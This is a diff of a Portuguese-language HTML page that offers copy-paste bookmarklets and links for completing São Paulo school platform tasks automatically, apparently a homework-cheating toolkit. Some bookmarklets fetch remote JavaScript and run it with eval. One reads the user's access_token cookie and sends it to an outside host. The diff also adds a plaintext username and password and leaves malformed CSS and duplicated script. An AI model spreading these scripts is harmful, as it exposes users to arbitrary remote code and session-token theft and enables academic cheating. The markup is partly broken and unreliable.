@@ -7,7 +7,7 @@
   
   
   <style>
-    
+   
 
     @keyframes slideFadeInOut {
       0% {
@@ -40,33 +40,12 @@
   font-family: 'Poppins', sans-serif;
   color: white;
   overflow-y: auto;
-  transform: scale(0,9, 1);           /* 👈 Aqui é o zoom */
-  transform-origin: top center ;    /* 👈 Mantém o zoom vindo de cima */
+  transform: scale(0.9,2,1);           /*  Aqui é o zoom */
+  transform-origin: top center ;    /*  Mantém o zoom vindo de cima */
 }
 
 
-    #welcome-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 4rem;
-      font-weight: 900;
-      color: #00ff88;
-      text-shadow:
-        0 0 8px #00ff88,
-        0 0 20px #00ff88,
-        0 0 30px #00ff88;
-      opacity: 0;
-      transform: scale(0.8);
-      animation: welcome-in 1.5s forwards, welcome-out 1s forwards 3s;
-      z-index: 1000;
-      background: #000000;
-    }
+    
 
     @keyframes welcome-in {
       to {
@@ -94,18 +73,130 @@
       border-bottom: 2px solid #2c2c2c;
     }
 
-    header h1 {
-      font-size: 3rem;
-      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: rgbText 5s linear infinite;
-    }
+    :root {
+  --color1: 255, 0, 255;      /* rosa */
+  --color2: 0, 255, 255;      /* ciano */
+  --color3: 255, 255, 0;      /* amarelo */
+  --color4: 0, 255, 0;        /* verde */
+  --color5: 255, 165, 0;      /* laranja */
+  --color6: 128, 0, 128;
+  --color7: 75, 0, 130;
+  --color8: 255, 20, 147;
+  --color9: 0, 128, 128;
+  --color10: 173, 255, 47;
+  --color11: 255, 69, 0;
+  --color12: 255, 140, 0;
+  --color13: 240, 230, 140;
+  --color14: 34, 139, 34;
+  --color15: 0, 191, 255;
+  --color16: 199, 21, 133;
+  --color17: 218, 112, 214;
+  --color18: 255, 0, 0;
+  --color19: 255, 192, 203;
+  --color20: 64, 224, 208;
+  --color21: 0, 255, 127;
+  --color22: 127, 255, 0;
+  --color23: 255, 215, 0;
+  --color24: 255, 105, 180;
+  --color25: 0, 100, 0;
+  --color26: 72, 61, 139;
+  --color27: 255, 69, 0;
+  --color28: 173, 216, 230;
+  --color29: 238, 130, 238;
+  --color30: 255, 20, 147;
+  --color31: 0, 255, 255;
+  --color32: 0, 128, 128;
+  --color33: 128, 128, 0;
+  --color34: 210, 105, 30;
+  --color35: 255, 0, 255;
+  --color36: 138, 43, 226;
+  --color37: 0, 255, 127;
+  --color38: 127, 255, 212;
+  --color39: 255, 165, 0;
+  --color40: 0, 100, 255;
+  --color41: 255, 69, 0;
+  --color42: 255, 20, 147;
+  --color43: 218, 165, 32;
+  --color44: 0, 206, 209;
+  --color45: 255, 182, 193;
+  --color46: 32, 178, 170;
+  --color47: 199, 21, 133;
+  --color48: 255, 255, 0;
+  --color49: 0, 128, 0;
+  --color50: 255, 0, 0;
+}
 
-    @keyframes rgbText {
-      0% { filter: hue-rotate(0deg); }
-      100% { filter: hue-rotate(360deg); }
-    }
+
+header h1 {
+  font-size: 4rem;
+  background: linear-gradient(
+    12345deg,
+    rgb(var(--color1)),
+    rgb(var(--color2)),
+    rgb(var(--color3)),
+    rgb(var(--color4)),
+    rgb(var(--color5)),
+    rgb(var(--color6)),
+    rgb(var(--color7)),
+    rgb(var(--color8)),
+    rgb(var(--color9)),
+    rgb(var(--color10)),
+    rgb(var(--color11)),
+    rgb(var(--color12)),
+    rgb(var(--color13)),
+    rgb(var(--color14)),
+    rgb(var(--color15)),
+    rgb(var(--color16)),
+    rgb(var(--color17)),
+    rgb(var(--color18)),
+    rgb(var(--color19)),
+    rgb(var(--color20)),
+    rgb(var(--color21)),
+    rgb(var(--color22)),
+    rgb(var(--color23)),
+    rgb(var(--color24)),
+    rgb(var(--color25)),
+    rgb(var(--color26)),
+    rgb(var(--color27)),
+    rgb(var(--color28)),
+    rgb(var(--color29)),
+    rgb(var(--color30)),
+    rgb(var(--color31)),
+    rgb(var(--color32)),
+    rgb(var(--color33)),
+    rgb(var(--color34)),
+    rgb(var(--color35)),
+    rgb(var(--color36)),
+    rgb(var(--color37)),
+    rgb(var(--color38)),
+    rgb(var(--color39)),
+    rgb(var(--color40)),
+    rgb(var(--color41)),
+    rgb(var(--color42)),
+    rgb(var(--color43)),
+    rgb(var(--color44)),
+    rgb(var(--color45)),
+    rgb(var(--color46)),
+    rgb(var(--color47)),
+    rgb(var(--color48)),
+    rgb(var(--color49)),
+    rgb(var(--color50))
+  );
+  background-size: 500% 100%;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  animation: moveGradient 120s linear infinite; /*  mais devagar */
+}
+
+
+@keyframes moveGradient {
+  0% { background-position: 0% 0%; }
+  100% { background-position: 100% 0%; }
+}
+
+
+
+
 
     nav {
       display: flex;
@@ -162,7 +253,7 @@
     }
 
     .script-box {
-      background: #000000;
+      background: #1e1e1e;
       padding: 1rem;
       border-radius: 8px;
       position: relative;
@@ -206,7 +297,7 @@
     }
 
     .pdf-box {
-      background: #000000;
+      background: #1e1e1e;
       padding: 1rem;
       margin-bottom: 1rem;
       border-radius: 8px;
@@ -253,16 +344,9 @@
 </head>
 <body>
 
-  <!-- Tela de boas-vindas -->
-  <div id="welcome-screen">𝑩𝒆𝒎-𝒗𝒊𝒏𝒅𝒐</div>
-
-  <!-- Conteúdo principal -->
-  <div id="site-content">
-
-    <div class="mode-pc" id="modePC">Modo PC Ativado</div>
 
     <header>
-      <h1>ƘȤƖƝ</h1>
+      <h1>KZIN</h1>
     </header>
 
     <nav>
@@ -273,58 +357,106 @@
     <!-- Seção de Scripts -->
 <div id="content-script" class="content-section active">
 
-  <section style="margin-bottom: 50px;"> <!-- 👈 Espaço entre seções -->
+  <section style="margin-bottom: 70px;">
     <div class="section-header">
       <h2>Tarefa Sp | Sala Do Futuro</h2>
     </div>
     <div class="script-box">
       <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
-      <code>https://gabaritus.moonscripts.cloud/</code>
+      <code>https://moonscripts.cloud/</code>
+    </div>
+    <p class="pc-label">Script para PC</p>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>https://cenouritos.vercel.app/</code>
     </div>
   </section>
 
-  <!-- Aqui viria a próxima seção, tipo "Khan Academy", e vai ficar afastada -->
-  <section style="margin-bottom: 50px;">
+  <section style="margin-bottom: 70px;">
     <div class="section-header">
       <h2>Khan Academy</h2>
     </div>
     <div class="script-box">
       <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
-      <code>javascript:fetch("https://raw.githubusercontent.com/Niximkk/Khanware/refs/heads/main/Khanware.js").then(t=>t.text()).then(eval);</code>
+      <code>https://cenouristo-khan-academy-cva-q7wx.vercel.app</code>
+    </div>
+    <p class="pc-label">Script para PC</p>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>https://cenouristo-khan-academy-cva-q7wx.vercel.app</code>
+    </div>
+<p></p>
+  <p>Usuário:  MARVOS</p>
+  <p>Senha:  CVA123</p>
+<p></p>
+  </section>
+
+  <section style="margin-bottom: 70px;">
+    <div class="section-header">
+      <h2>Speak | SP</h2>
+    </div>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>javascript:fetch('https://res.cloudinary.com/dtp29k95n/raw/upload/v1750961477/book_dwju2r.js').then(r=>r.text()).then(r=>eval(r))</code>
+    </div>
+    <p class="pc-label">Script para PC</p>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>https://speakify.cupiditys.lol/</code>
     </div>
   </section>
 
-
-        <section style="margin-bottom: 50px;">
-        <div class="section-header">
-          <h2>Speak | SP</h2>
-        </div>
-        <div class="script-box">
-          <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
-          <code>javascript:fetch("https://speakify.cupiditys.lol/api/bookmark.js").then(r => r.text()).then(r => eval(r))</code>
-        </div>
-      </section>
-
-        <section style="margin-bottom: 50px;">
-        <div class="section-header">
-          <h2>Redação Paulista</h2>
-        </div>
-        <div class="script-box">
-          <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
-          <code>https://redacao.cupiditys.lol/</code>
-        </div>
-      </section>
-
-      <section>
-        <div class="section-header">
-          <h2>Leia | SP</h2>
-        </div>
-        <div class="script-box">
-          <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
-          <code>javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Este script só funciona no Árvore!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split('access_token=')[1].split(';')[0]))}`)}();</code>
-        </div>
-      </section>
+  <section style="margin-bottom: 70px;">
+    <div class="section-header">
+      <h2>Redação Paulista</h2>
     </div>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>https://redacao.cupiditys.lol/</code>
+    </div>
+    <p class="pc-label">Script para PC</p>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>https://exemplo.com/redacao-pc</code>
+    </div>
+  </section>
+
+  <section>
+    <div class="section-header">
+      <h2>Leia | SP</h2>
+    </div>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Este script só funciona no Árvore!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split('access_token=')[1].split(';')[0]))}`)}();</code>
+    </div>
+    <p class="pc-label">Script para PC</p>
+    <div class="script-box">
+      <button class="copy-btn" onclick="copyScript(this)">Copiar</button>
+      <code>https://leiasp.cupiditys.lol/</code>
+</section>
+</div>
+
+<style>
+.section-header {
+  font-size: 14px;
+  color: #00FFFF
+;
+  margin: 5px 0;
+  font-style: italic;
+
+</style>
+
+<style>
+.pc-label {
+  font-size: 14px;
+  color: #00FFFF
+;
+  margin: 5px 0;
+  font-style: italic;
+
+</style>
+
+
 
     <!-- Seção de Apostilas -->
     <div id="content-apostila" class="content-section">
@@ -335,17 +467,17 @@
 
         <div class="pdf-box">
           <h3>Física, Biologia, Química - Volume 3</h3>
-          <a href="https://www.mediafire.com/file/1o0np74g4qdjep9/F%C3%ADsica%2C_Biologia%2C_Qu%C3%ADmica_-_Volume_3.pdf/file" target="_blank">📥 Baixar PDF</a>
+          <a href="https://www.mediafire.com/file/1o0np74g4qdjep9/F%C3%ADsica%2C_Biologia%2C_Qu%C3%ADmica_-_Volume_3.pdf/file" target="_blank"> Baixar PDF</a>
         </div>
 
         <div class="pdf-box">
           <h3>Matemática e Língua Portuguesa - Volume 3</h3>
-          <a href="https://www.mediafire.com/file/i7hnmiq17t86px1/Matem%C3%A1tica_e_L%C3%ADngua_Portuguesa_-_Volume_3.pdf/file" target="_blank">📥 Baixar PDF</a>
+          <a href="https://www.mediafire.com/file/i7hnmiq17t86px1/Matem%C3%A1tica_e_L%C3%ADngua_Portuguesa_-_Volume_3.pdf/file" target="_blank"> Baixar PDF</a>
         </div>
 
         <div class="pdf-box">
           <h3>História e Geografia - Volume 3</h3>
-          <a href="https://www.mediafire.com/file/fg9md25e5ty2wkb/Hist%C3%B3ria_e_Geografia_-_Volume_3.pdf/file" target="_blank">📥 Baixar PDF</a>
+          <a href="https://www.mediafire.com/file/fg9md25e5ty2wkb/Hist%C3%B3ria_e_Geografia_-_Volume_3.pdf/file" target="_blank"> Baixar PDF</a>
         </div>
       </section>
     </div>
@@ -387,13 +519,20 @@
     function copyScript(btn) {
       const code = btn.parentElement.querySelector("code");
       navigator.clipboard.writeText(code.textContent.trim()).then(() => {
-        btn.textContent = "✅";
+        btn.textContent = "";
         setTimeout(() => btn.textContent = "Copiar", 1500);
       });
     }
 
     if (new URLSearchParams(window.location.search).get('modo') === 'pc') {
       document.getElementById('modePC').style.display = 'block';
+    }
+  </script>
+
+
+
+</body>
+</html>   document.getElementById('modePC').style.display = 'block';
     }
   </script>
 
